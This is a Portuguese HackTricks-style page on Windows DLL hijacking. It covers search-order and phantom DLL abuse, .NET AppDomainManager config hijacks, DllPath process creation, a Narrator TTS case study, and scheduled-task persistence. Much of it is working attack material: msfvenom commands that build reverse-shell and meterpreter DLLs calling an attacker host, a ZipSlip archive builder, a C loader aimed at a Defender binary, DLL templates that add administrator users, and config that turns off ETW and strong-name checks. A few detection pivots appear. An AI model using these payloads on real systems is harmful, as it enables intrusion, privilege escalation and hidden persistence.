# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informações básicas

DLL Hijacking envolve manipular uma aplicação confiável para que carregue uma DLL maliciosa. Esse termo engloba várias táticas, como **DLL Spoofing, Injection e Side-Loading**. É utilizado principalmente para execução de código, obtenção de persistência e, com menos frequência, privilege escalation. Apesar do foco aqui ser a escalation, o método de hijacking permanece consistente entre os diferentes objetivos.

### Técnicas comuns

Vários métodos são utilizados para DLL hijacking, e a eficácia de cada um depende da estratégia de carregamento de DLL da aplicação:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Substituir uma DLL legítima por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade da DLL original.
2. **DLL Search Order Hijacking**: Colocar a DLL maliciosa em um caminho de pesquisa anterior ao da DLL legítima, explorando o padrão de pesquisa da aplicação.
3. **Phantom DLL Hijacking**: Criar uma DLL maliciosa para que uma aplicação a carregue, acreditando que ela é uma DLL necessária inexistente.
4. **DLL Redirection**: Modificar parâmetros de pesquisa, como `%PATH%`, ou arquivos `.exe.manifest` / `.exe.local` para direcionar a aplicação à DLL maliciosa.
5. **WinSxS DLL Replacement**: Substituir a DLL legítima por uma equivalente maliciosa no diretório WinSxS, um método frequentemente associado a DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário junto com a aplicação copiada, de forma semelhante às técnicas de Binary Proxy Execution.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

O DLL sideloading clássico não é a única forma de fazer um processo **.NET Framework** confiável carregar código controlado pelo atacante. Se o executável-alvo for uma aplicação **managed**, o CLR também consulta um arquivo de configuração da aplicação nomeado de acordo com o executável (por exemplo, `Setup.exe.config`). Esse arquivo pode definir um **AppDomainManager** personalizado. Se a configuração apontar para um assembly controlado pelo atacante, colocado ao lado do EXE, o CLR o carrega **antes do fluxo normal de código da aplicação** e o executa dentro do processo confiável.<sup>[[24]](#references)</sup>

De acordo com o schema de configuração do .NET Framework da Microsoft, tanto `<appDomainManagerAssembly>` quanto `<appDomainManagerType>` devem estar presentes para que o manager personalizado seja utilizado.<sup>[[16]](#references)[[17]](#references)</sup>

Configuração mínima:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Gerenciador mínimo:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Notas práticas:
- Este é um tradecraft específico do **.NET Framework**. Ele depende do parsing da configuração do CLR, não da ordem de busca de DLLs do Win32.
- O host deve ser realmente um **managed EXE**. Triagem rápida: `sigcheck -m target.exe`, `corflags target.exe` ou verifique o **CLR Runtime Header** nos metadados do PE.
- O nome do arquivo de configuração deve corresponder exatamente ao nome do executável (`<binary>.config`) e geralmente fica **ao lado do EXE**.
- Isso é útil com binários assinados da **Microsoft/de fornecedores**, porque o EXE confiável permanece intocado enquanto o assembly managed malicioso é executado no processo.
- Se você já tiver um diretório de installer/update com permissão de escrita, o hijacking de AppDomainManager pode ser usado como **first stage**, seguido de DLL sideloading clássico ou reflective loading para os stages posteriores.

### AppDomainManager como downloader + bootstrap de tarefa agendada

Um padrão prático de intrusão consiste em combinar o managed EXE confiável com um `*.config` malicioso e uma DLL maliciosa de AppDomainManager que atua somente como um **bootstrapper pequeno**:<sup>[[25]](#references)</sup>

1. O usuário inicia um installer ou updater .NET assinado a partir de um local plausível, como `%USERPROFILE%\Downloads`.
2. A configuração adjacente faz o CLR carregar o assembly do atacante **antes** do início da lógica legítima do aplicativo.
3. O manager malicioso executa um **path gate** (por exemplo, continua somente se o host EXE estiver sendo executado a partir de `Downloads` e permite que o segundo stage seja executado somente a partir de `%LOCALAPPDATA%`).
4. Se a verificação for aprovada, ele baixa o payload real para um caminho com permissão de escrita pelo usuário, como `%LOCALAPPDATA%\PerfWatson2.exe`, e estabelece persistence com uma scheduled task.

Por que essa variante é relevante:
- O host EXE assinado permanece inalterado, portanto uma triagem que verifica apenas o hash do binário principal pode não detectar o comprometimento.
- **Anti-analysis baseada em path** simples é comum: mover o trio ZIP/EXE/DLL para Desktop, Temp ou um caminho de sandbox pode interromper intencionalmente a cadeia.
- A DLL de AppDomainManager do first stage pode permanecer pequena e gerar poucos sinais, enquanto o implant real é obtido posteriormente.

Exemplo mínimo de persistence frequentemente observado com esse padrão:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Observações:
- ` /rl highest` significa **highest available** para esse usuário/sessão; por si só, não garante uma escalação para SYSTEM.
- Essa técnica costuma ser mais bem categorizada como **execução/persistência via abuso de configuração do .NET** do que como o clássico hijacking de ordem de pesquisa de DLL ausente, embora os operadores frequentemente encadeiem ambos.

Pivôs de detecção:
- Executáveis .NET assinados iniciados a partir de **caminhos de extração de ZIP**, `Downloads`, `%TEMP%` ou outras pastas graváveis pelo usuário, com um `<exe>.config` **colocado junto**.
- Novas tarefas agendadas cuja ação aponta para `%LOCALAPPDATA%`, `%APPDATA%` ou `Downloads` e cujos nomes imitam atualizadores de navegadores/fornecedores.
- Processos bootstrap gerenciados de curta duração que baixam imediatamente outro EXE e depois iniciam `schtasks.exe`.
- Samples que encerram antecipadamente, a menos que o caminho do executável corresponda a um diretório esperado no perfil do usuário.

### Hijacking de uma tarefa agendada existente para relançar a cadeia de sideload

Para persistência, não procure apenas por **criação de uma nova tarefa**. Alguns conjuntos de intrusão aguardam até que um instalador legítimo crie uma **tarefa normal de atualização** e então **reescrevem a ação da tarefa**, mantendo o mesmo nome, autor e trigger familiares aos defensores.

Workflow reutilizável:
1. Instale/execute o software legítimo e identifique a tarefa que ele normalmente cria.
2. Exporte o XML da tarefa e anote os valores atuais de `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Substitua somente a ação para que a tarefa inicie seu **host EXE confiável** a partir de um diretório de staging gravável pelo usuário, que então faça sideload ou carregue via AppDomain o payload real.
4. Registre novamente o mesmo nome de tarefa em vez de criar um artefato de persistência obviamente novo.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Por que é mais furtivo:
- O nome da tarefa ainda pode parecer legítimo (por exemplo, um updater de fornecedor).
- O serviço **Task Scheduler** a inicia, portanto a validação do processo pai/ancesor frequentemente vê a cadeia de agendamento esperada, em vez de `explorer.exe`.
- Equipes de DFIR que procuram apenas **novos nomes de tarefas** podem não perceber uma tarefa cujo registro já existia, mas cuja ação agora aponta para `%LOCALAPPDATA%`, `%APPDATA%` ou outro caminho controlado pelo atacante.

Pivôs rápidos para hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare o XML de `C:\Windows\System32\Tasks\*` e os metadados de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` com uma baseline.
- Gere um alerta quando uma **tarefa de updater com aparência de fornecedor** executar a partir de **diretórios graváveis pelo usuário** ou iniciar um EXE .NET com um arquivo `*.config` no mesmo diretório.

> [!TIP]
> Para uma cadeia passo a passo que combina HTML staging, configs AES-CTR e implants .NET sobre DLL sideloading, consulte o workflow abaixo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Encontrando DLLs ausentes

A maneira mais comum de encontrar Dlls ausentes dentro de um sistema é executar o [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **configurando** os **2 filtros a seguir**:

![Common Techniques - Encontrando Dlls ausentes: A maneira mais comum de encontrar Dlls ausentes dentro de um sistema é executar o procmon do sysinternals, configurando os 2 filtros a seguir](<../../../images/image (961).png>)

![Common Techniques - Encontrando Dlls ausentes: A maneira mais comum de encontrar Dlls ausentes dentro de um sistema é executar o procmon do sysinternals, configurando os 2 filtros a seguir](<../../../images/image (230).png>)

e mostrar apenas a **File System Activity**:

![Common Techniques - Encontrando Dlls ausentes: e mostrar apenas a File System Activity](<../../../images/image (153).png>)

Se você estiver procurando por **dlls ausentes em geral**, **deixe** isso em execução por alguns **segundos**.\
Se você estiver procurando por uma **DLL ausente dentro de um executável específico**, configure outro filtro, como **"Process Name" "contains" `<exec name>`**, execute-o e pare de capturar eventos.<sup>[[9]](#references)</sup>

## Explorando DLLs ausentes

Para escalar privilégios, procure uma **DLL que um processo privilegiado tente carregar** a partir de um local no qual você possa gravar. Isso pode acontecer quando você controla um diretório pesquisado antes do diretório que contém a DLL legítima, ou quando a DLL solicitada não existe e você pode gravar em um dos diretórios pesquisados.

### Ordem de pesquisa de DLL

**Na** [**documentação da Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching), **você pode encontrar como as Dlls são carregadas especificamente.**

**Aplicações Windows** procuram DLLs seguindo um conjunto de **caminhos de pesquisa predefinidos**, obedecendo a uma sequência específica. O problema do DLL hijacking surge quando uma DLL maliciosa é estrategicamente colocada em um desses diretórios, garantindo que seja carregada antes da DLL autêntica. Uma solução para evitar isso é garantir que a aplicação use caminhos absolutos ao referenciar as DLLs necessárias.

Você pode ver abaixo a **ordem de pesquisa de DLL em sistemas de 32 bits**:

1. O diretório a partir do qual a aplicação foi carregada.
2. O diretório do sistema. Use a função [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obter o caminho desse diretório.(_C:\Windows\System32_)
3. O diretório do sistema de 16 bits. Não existe uma função que obtenha o caminho desse diretório, mas ele é pesquisado. (_C:\Windows\System_)
4. O diretório do Windows. Use a função [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obter o caminho desse diretório.
1. (_C:\Windows_)
5. O diretório atual.
6. Os diretórios listados na variável de ambiente PATH. Observe que isso não inclui o caminho por aplicação especificado pela chave de registro **App Paths**. A chave **App Paths** não é usada ao calcular o caminho de pesquisa de DLL.

Essa é a ordem de pesquisa **padrão** com **SafeDllSearchMode** habilitado. Quando desabilitado, o diretório atual sobe para a segunda posição. Para desabilitar esse recurso, crie o valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (o padrão é habilitado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD_WITH_ALTERED_SEARCH_PATH**, a pesquisa começa no diretório do módulo executável que **LoadLibraryEx** está carregando.

Por fim, uma DLL pode ser carregada por caminho absoluto em vez de pelo nome. Nesse caso, o Windows procura a DLL apenas nesse caminho; as dependências solicitadas pelo nome ainda seguem a ordem de pesquisa aplicável.

Existem outras maneiras de alterar a ordem de pesquisa, mas não vou explicá-las aqui.

### Encadeando uma gravação arbitrária de arquivo em um hijack de DLL ausente

**Técnica relacionada:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Use filtros do **ProcMon** (`Process Name` = EXE alvo, `Path` termina com `.dll`, `Result` = `NAME NOT FOUND`) para coletar os nomes das DLLs que o processo procura, mas não consegue encontrar.<sup>[[14]](#references)</sup>
2. Se o binário for executado por um **agendamento/serviço**, colocar uma DLL com um desses nomes no **diretório da aplicação** (entrada nº 1 da ordem de pesquisa) fará com que ela seja carregada na próxima execução. Em um caso envolvendo um scanner .NET, o processo procurava `hostfxr.dll` em `C:\samples\app\` antes de carregar a cópia real de `C:\Program Files\dotnet\fxr\...`.
3. Crie uma DLL de payload (por exemplo, um reverse shell) com qualquer export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se sua primitive for uma **gravação arbitrária no estilo ZipSlip**, crie um ZIP cuja entrada escape do diretório de extração para que a DLL seja colocada na pasta da aplicação:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Entregue o archive à inbox/share monitorada; quando a scheduled task relançar o processo, ele carregará a DLL maliciosa e executará seu código como a service account.

### Forçando o sideloading por meio de RTL_USER_PROCESS_PARAMETERS.DllPath

Uma forma avançada de influenciar deterministicamente o caminho de busca da DLL de um processo recém-criado é definir o campo DllPath em RTL_USER_PROCESS_PARAMETERS ao criar o processo com as APIs nativas do ntdll. Ao fornecer aqui um diretório controlado pelo atacante, um processo-alvo que resolve uma DLL importada pelo nome (sem caminho absoluto e sem usar os safe loading flags) pode ser forçado a carregar uma DLL maliciosa desse diretório.

Ideia principal
- Crie os parâmetros do processo com RtlCreateProcessParametersEx e forneça um DllPath personalizado que aponte para sua pasta controlada (por exemplo, o diretório onde seu dropper/unpacker está localizado).
- Crie o processo com RtlCreateUserProcess. Quando o binário-alvo resolver uma DLL pelo nome, o loader consultará o DllPath fornecido durante a resolução, permitindo um sideloading confiável mesmo quando a DLL maliciosa não estiver no mesmo diretório do EXE-alvo.

Observações/limitações
- Isso afeta o processo filho que está sendo criado; é diferente de SetDllDirectory, que afeta somente o processo atual.
- O alvo deve importar ou usar LoadLibrary para carregar uma DLL pelo nome (sem caminho absoluto e sem usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e caminhos absolutos hardcoded não podem ser hijacked. Exports encaminhados e SxS podem alterar a precedência.

Exemplo mínimo em C (ntdll, wide strings, tratamento de erros simplificado):

<details>
<summary>Exemplo completo em C: forçando o DLL sideloading por meio de RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Exemplo de uso operacional
- Coloque uma xmllite.dll maliciosa (exportando as funções necessárias ou fazendo proxy para a real) no seu diretório DllPath.
- Inicie um binário assinado conhecido por procurar xmllite.dll pelo nome usando a técnica acima. O loader resolve a importação por meio do DllPath fornecido e faz sideload da sua DLL.

Essa técnica foi observada em campanhas reais para conduzir cadeias de sideloading em várias etapas: um launcher inicial solta uma DLL auxiliar, que então inicia um binário assinado pela Microsoft e passível de hijacking, com um DllPath personalizado para forçar o carregamento da DLL do atacante a partir de um diretório de staging.<sup>[[6]](#references)</sup>


### Hijacking de .NET AppDomainManager via `.exe.config`

Para alvos **.NET Framework**, o sideloading pode ser realizado **antes de `Main()`** sem modificar a memória, abusando do arquivo **`.exe.config`** adjacente da aplicação. Em vez de depender apenas da ordem de pesquisa de DLLs do Win32, o atacante coloca um EXE .NET legítimo ao lado de uma configuração maliciosa e de um ou mais assemblies controlados pelo atacante.

Como a cadeia funciona:<sup>[[15]](#references)[[22]](#references)</sup>
1. O EXE host é iniciado e o **CLR lê `<exe>.config`**.
2. A configuração define **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`**, fazendo com que o runtime instancie um `AppDomainManager` controlado pelo atacante.
3. O manager malicioso obtém **execução pré-`Main()`** dentro do processo host confiável.
4. A mesma configuração pode forçar o CLR a resolver primeiro os assemblies locais (por exemplo, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) e pode enfraquecer a validação/telemetria do runtime sem patching inline.

Padrão no estilo de campanhas (o aninhamento exato pode variar conforme a diretiva / versão do CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Por que isso é útil:
- **`<probing privatePath="."/>`** mantém a resolução de assemblies no diretório da aplicação, transformando a pasta em uma superfície previsível de sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** transferem a execução para o código do atacante durante a inicialização do CLR, antes que a lógica da aplicação legítima seja executada.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** pode permitir que uma aplicação full-trust carregue assemblies sem assinatura ou adulterados sem uma falha de validação de strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita redirecionamentos da publisher policy para assemblies mais recentes.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** torna a seleção do runtime mais determinística.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** é especialmente interessante porque o **CLR desativa sua própria visibilidade via ETW** a partir da configuração, em vez de o implant modificar `EtwEventWrite` na memória.

Padrão operacional observado em campanhas recentes:
- O Stage 1 deposita `setup.exe`, `setup.exe.config` e assemblies locais.
- O Stage 2 os copia para uma pasta verossímil de **atualização em AppData**, renomeia o host para algo como `update.exe` e o inicia novamente por meio de uma **scheduled task**.
- O Stage 3 verifica o contexto de execução (por exemplo, o `svchost.exe` pai esperado do Task Scheduler) antes de carregar a RAT DLL/export final.

Ideias para hunting:
- **executáveis .NET** assinados ou de outra forma legítimos sendo executados com arquivos **`.config`** adjacentes suspeitos em locais graváveis pelo usuário.
- Arquivos `.config` contendo **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ou **`etwEnable enabled="false"`**.
- Scheduled tasks que iniciam novamente binários de atualização renomeados a partir de **`%LOCALAPPDATA%`** ou de diretórios específicos de aplicações, como **`\bin\update\`**.
- Cadeias de processos pai/filho nas quais uma scheduled task inicia um host .NET confiável que imediatamente carrega assemblies que não são do fornecedor a partir de seu próprio diretório.

#### Exceções à ordem de busca de DLLs na documentação do Windows

Algumas exceções à ordem padrão de busca de DLLs são mencionadas na documentação do Windows:

- Quando uma **DLL que compartilha seu nome com uma já carregada na memória** é encontrada, o sistema ignora a busca usual. Em vez disso, ele verifica redirection e um manifest antes de usar como padrão a DLL já existente na memória. **Nesse cenário, o sistema não realiza uma busca pela DLL**.
- Nos casos em que a DLL é reconhecida como uma **known DLL** para a versão atual do Windows, o sistema utilizará sua versão da known DLL, juntamente com quaisquer DLLs dependentes, **dispensando o processo de busca**. A chave do registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém uma lista dessas known DLLs.
- Caso uma **DLL tenha dependências**, a busca por essas DLLs dependentes é realizada como se elas fossem indicadas apenas por seus **nomes de módulo**, independentemente de a DLL inicial ter sido identificada por meio de um caminho completo.

### Escalando Privilégios

**Requisitos**:

- Identifique um processo que opere ou vá operar com **privilégios diferentes** (movimentação horizontal ou lateral) e que esteja **sem uma DLL**.
- Garanta que haja **acesso de escrita** a qualquer **diretório** no qual a **DLL** será **procurada**. Esse local pode ser o diretório do executável ou um diretório dentro do system path.

Esses pré-requisitos são incomuns por padrão: executáveis privilegiados normalmente não possuem dependências de DLL ausentes, e usuários padrão normalmente não podem escrever em diretórios do system search path. Ambientes mal configurados ainda podem expor ambas as condições.\
Se os requisitos forem atendidos, verifique o projeto [UACME](https://github.com/hfiref0x/UACME). Embora seu objetivo principal seja o UAC bypass, ele contém PoCs de DLL hijacking para versões específicas do Windows que geralmente podem ser adaptadas ao diretório gravável encontrado.

Observe que você pode **verificar suas permissões em uma pasta** executando:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar as importações de um executável e as exportações de uma dll com:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para obter um guia completo sobre como **abusar de DLL Hijacking para escalar privilégios** com permissões de escrita em uma **pasta do System Path**, consulte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Ferramentas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará se você tem permissões de escrita em alguma pasta dentro do System PATH.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as **funções do PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Exemplo

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso seria **criar uma dll que exporte pelo menos todas as funções que o executável importará dela**. De qualquer forma, observe que o DLL Hijacking é útil para [escalar do nível de Integridade Média para Alta **(bypass do UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de[ **Integridade Alta para SYSTEM**](../index.html#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar uma dll válida** dentro deste estudo sobre DLL hijacking focado em DLL hijacking para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seção**, você encontrará alguns **códigos básicos de dll** que podem ser úteis como **templates** ou para criar uma **dll com funções não obrigatórias exportadas**.

## **Criando e compilando DLLs**

### **Proxificação de DLL**

Basicamente, um **proxy de DLL** é uma DLL capaz de **executar seu código malicioso quando carregada**, mas também de **expor** e **funcionar** como **esperado**, **retransmitindo todas as chamadas para a biblioteca real**.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), você pode **indicar um executável e selecionar a biblioteca** que deseja proxificar e **gerar uma dll proxificada**, ou **indicar a DLL** e **gerar uma dll proxificada**.

### **Meterpreter**

**Obter uma rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenha um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86, não vi uma versão x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Seu próprio

Em muitos casos, a DLL compilada deve **exportar todas as funções importadas pelo processo vítima**. Se uma exportação necessária estiver ausente, o binário não poderá resolvê-la e o exploit falhará.

<details>
<summary>Template de DLL em C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemplo de DLL em C++ com criação de usuário</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa com entrada de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudo de caso: DLL Hijack de localização do Narrator OneCore TTS (Acessibilidade/ATs)

O Windows Narrator.exe ainda procura uma DLL de localização previsível e específica do idioma na inicialização, que pode ser hijacked para execução arbitrária de código e persistência.<sup>[[7]](#references)</sup>

Fatos principais
- Caminho de procura (builds atuais): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Caminho legado (builds antigos): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se existir uma DLL controlada pelo atacante e com permissão de escrita no caminho OneCore, ela será carregada e `DllMain(DLL_PROCESS_ATTACH)` será executado. Nenhuma exportação é necessária.

Descoberta com Procmon
- Filtro: `Process Name is Narrator.exe` e `Operation is Load Image` ou `CreateFile`.
- Inicie o Narrator e observe o carregamento tentado do caminho acima.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silêncio de OPSEC
- Um hijack ingênuo falará/destacará a UI. Para permanecer silencioso, ao anexar, enumere as threads do Narrator, abra a thread principal (`OpenThread(THREAD_SUSPEND_RESUME)`) e suspenda-a com `SuspendThread`; continue na sua própria thread. Consulte o PoC para ver o código completo.<sup>[[8]](#references)</sup>

Trigger e persistência via configuração de Accessibility
- Contexto do usuário (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
